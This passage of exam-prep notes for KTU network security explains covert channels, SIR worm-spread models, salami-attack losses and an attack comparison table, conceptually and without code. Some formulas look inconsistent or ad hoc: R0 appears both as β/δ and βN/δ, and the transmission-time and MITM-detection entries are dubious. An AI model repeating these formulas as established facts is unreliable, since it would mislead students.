- **Initial Sequence Number (ISN)** — can encode 32 bits per SYN
- **IP Identification field** — 16 bits per packet
- **TCP Urgent Pointer** — 16 bits
- **IP Timestamp options** — variable
- **Unused/reserved bits** in IP/TCP flags

A covert channel using ISNs can transmit:

$$C_{\text{storage}} = 32 \text{ bits per SYN packet}$$

### Covert Timing Channel — Capacity Model
For a binary timing channel modulating inter-packet delay:

$$C_{\text{timing}} = \frac{1}{T} \sum_{i=1}^{N} H(X_i) \text{ bits/sec}$$

where:
- $T$ = observation window
- $X_i$ = symbol sent in slot $i$ (0 or 1)
- $H(X_i) = 1$ bit for balanced binary

> [!NOTE]
> **Real-world Example:** The **Covert_TCP** tool (H. Rowland, 1996) embeds data in the ISN field of TCP SYN packets to bypass firewall inspection — a canonical KTU exam example.

### Detection of Covert Channels
- **Traffic analysis / anomaly detection** (statistical, machine learning)
- **Padding / normalization** of protocol fields (e.g., zeroing unused bits)
- **Information flow analysis** at the OS/kernel level (non-interference models)
- **Reference monitors** that audit shared resources

---

## 2.8 KTU High-Yield Formula Sheet

> [!IMPORTANT]
> **All formulas a KTU 2024 student must memorize for this topic:**

| # | Concept | Formula / Expression | Meaning |
|---|---------|---------------------|---------|
| 1 | **Epidemic worm model (Simple)** | $\frac{dI(t)}{dt} = \beta \cdot S(t) \cdot I(t)$ | Rate of new infections |
| 2 | **Epidemic model (with removal)** | $\frac{dI(t)}{dt} = \beta \cdot S(t) \cdot I(t) - \delta \cdot I(t)$ | $\delta$ = removal/death rate |
| 3 | **Basic Reproduction Number** | $R_0 = \dfrac{\beta}{\delta}$ | Threshold for outbreak ($R_0 > 1$ ⇒ epidemic) |
| 4 | **Topological worm spread** | $R_0 = \beta \cdot \bar{k}$ | $k$ = avg. topology neighbors |
| 5 | **Covert storage capacity (ISN)** | $C = 32$ bits per packet | One TCP SYN |
| 6 | **Covert timing capacity** | $C = \dfrac{N}{T} \cdot H(X)$ | Bits per second |
| 7 | **MITM detection delay** | $T_{\text{detect}} \approx \dfrac{1}{P_{\text{anomaly}}}$ | Inverse of anomaly probability |
| 8 | **Salami cumulative theft** | $L_{\text{total}} = n \cdot \Delta$ | $n$ = transactions, $\Delta$ = micro-loss |
| 9 | **Packet transmission time** | $T_{\text{trans}} = \dfrac{L_{\text{header}}}{R_{\text{line}}} \cdot C$ | Header length / line rate |
| 10 | **Hit-list propagation speed** | $T_{\text{outbreak}} \approx \log_2 N \cdot t_{\text{scan}}$ | Halving list per infection |

---

# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: Classical Epidemic Worm Model (Kermack-McKendrick)

The standard KTU derivation models a worm outbreak as a **Susceptible–Infected (SI)** or **Susceptible–Infected–Recovered (SIR)** compartmental model from mathematical epidemiology.

### 3.1.1 Setting Up the Variables

Let:
- $N$ = total population (vulnerable hosts)
- $S(t)$ = number of Susceptible (vulnerable, uninfected) hosts at time $t$
- $I(t)$ = number of Infected hosts at time $t$
- $\beta$ = infection rate (contacts/sec leading to successful infection)
- $\delta$ = removal/recovery rate (patched, isolated, taken offline)
- $R(t)$ = Recovered (patched/immunized) hosts

Conservation law:

$$N = S(t) + I(t) + R(t)$$

### 3.1.2 Differential Equation for Susceptibles

Each infected host contacts $\beta$ susceptibles per unit time, and there are $I(t)$ infected hosts:

$$\frac{dS}{dt} = -\beta \cdot S(t) \cdot I(t)$$

> **Reasoning:** The number of new infections per unit time is the product of (a) the number of susceptibles available, $S(t)$, and (b) the contact-and-infection attempts coming from $I(t)$ infected hosts at rate $\beta$.

### 3.1.3 Differential Equation for Infected Hosts

Infected hosts **increase** by new infections and **decrease** by recovery (patching):

$$\frac{dI}{dt} = \beta \cdot S(t) \cdot I(t) - \delta \cdot I(t)$$

### 3.1.4 Differential Equation for Recovered Hosts

$$\frac{dR}{dt} = \delta \cdot I(t)$$

### 3.1.5 Deriving the Basic Reproduction Number $R_0$

Near the start of an outbreak, $S(t) \approx N$ and $I(t)$ is small. Then:

$$\frac{dI}{dt} \approx (\beta N - \delta) \cdot I(t)$$

This has solution:

$$I(t) \approx I(0) \cdot e^{(\beta N - \delta) t}$$

For an **epidemic** to occur, the exponent must be positive:

$$\beta N - \delta > 0 \quad \Longrightarrow \quad \frac{\beta N}{\delta} > 1$$

Defining the basic reproduction number:

$$R_0 = \frac{\beta N}{\delta}$$

**Conclusion:** The worm will spread if and only if $R_0 > 1$.

### 3.1.6 Final Threshold Theorem

In the early phase of a homogeneous worm outbreak:

$$\begin{aligned}
\text{Outbreak occurs} &\iff R_0 > 1 \\[4pt]
\text{Infection dies out} &\iff R_0 \le 1
\end{aligned}$$

> [!NOTE]
> **KTU Insight:** The reproduction number formula tells network defenders that to *contain* a worm, they must either **reduce $\beta$** (slow scanning), **reduce $N$** (segment the network), or **increase $\delta$** (faster patching, sinkholing). This is the engineering intuition behind every worm-defence design.

---

## 3.2 Derivation: Topological Worm Reproduction Number

For a **topological worm**, the per-host infection rate depends on the **graph of relationships** $G = (V, E)$ where $V$ = hosts, $E$ = communication edges (email, P2P, etc.).

Let $\bar{k}$ = average node degree in $G$:

$$\bar{k} = \frac{1}{|V|} \sum_{v \in V} \deg(v)$$

Each infected host has, on average, $\bar{k}$ topology neighbors, and each neighbor has a per-contact infection probability $\beta$:

$$R_0 = \beta \cdot \bar{k}$$

> **Engineering Implication:** Topological worms are *more dangerous* in dense social networks (high $\bar{k}$). A network where every user has 500 email contacts is a far more fertile worm-vessel than one with 5.

---

## 3.3 Derivation: Salami Attack Cumulative Loss

A programmer modifies a billing engine to **round down** each transaction to the nearest sub-unit (e.g., 1 cent) and divert the remainder to a shadow account.

Let:
- $n$ = total number of transactions per period
- $p$ = probability that a transaction has a non-zero fractional part
- $\Delta$ = mean fractional residual diverted per transaction (e.g., 0.005 units if uniformly distributed over $[0, 0.01]$)

Expected cumulative loss per period:

$$L_{\text{total}} = n \cdot p \cdot \Delta$$

**Example (KTU-style):**
If a bank processes $n = 1{,}000{,}000$ transactions per day, $p = 0.95$ (almost all have cents), $\Delta = 0.005$ units:

$$L_{\text{total}} = 10^6 \cdot 0.95 \cdot 0.005 = 4{,}750 \text{ units/day}$$

Over a year, ≈ **1.73 million units** stolen — *without* triggering any single-account alert.

---

## 3.4 Analytical Comparison Matrix

| Attack | Primary CIA Violated | Attack Vector | Detection Difficulty | KTU Exam Frequency |
|--------|----------------------|---------------|----------------------|---------------------|
| Virus | Integrity, Availability | Host file + user action | Low–Medium (signatures) | **Very High** |
| Worm | Availability, Integrity | Network service vuln | Medium (NetFlow, darknets) | **Very High** |
| Trojan | Confidentiality | Social engineering | Medium (heuristics) | High |
| Topological Worm | Availability | Trusted contacts | **High** (looks like legit traffic) | High |
| Trapdoor | Confidentiality, AuthN | Pre-inserted in code | **Very High** (looks like a feature) | High |
| Salami | Integrity (financial) | Insider + software | **Very High** (sub-threshold losses) | High |
| MITM | Confidentiality, Integrity | Network interception | Medium (cert pinning) | **Very High** |
| Covert Channel | Confidentiality | Protocol/timing abuse | **Extremely High** | Medium |

---

## 3.5 Worked Numerical Example — Covert Timing Channel Capacity

A covert timing channel sends 1 bit per packet by **delaying** packets by either **+5 ms (bit 1)** or **+0 ms (bit 0)** from a baseline. The sender emits 100 packets/sec. Assume binary, balanced.

Step 1: Bit per packet = 1.

Step 2: Bits per second = $1 \text{ bit/packet} \times 100 \text{ packets/sec} = 100$ bits/sec.

Step 3: Using the formula:

$$C_{\text{timing}} = \frac{N}{T} \cdot H(X) = \frac{100}{1} \cdot 1 = 100 \text{ bits/sec}$$

Step 4: To transfer a 1 KB covert file (8192 bits):

$$t_{\text{transfer}} = \frac{8192}{100} = 81.92 \text{ seconds}$$

> [!IMPORTANT]
> **Examiner's View:** Even a *low-rate* covert timing channel can leak a sensitive cryptographic key (e.g., 256-bit AES key) in under 3 seconds. This is why high-assurance systems **normalize inter-packet timing**.
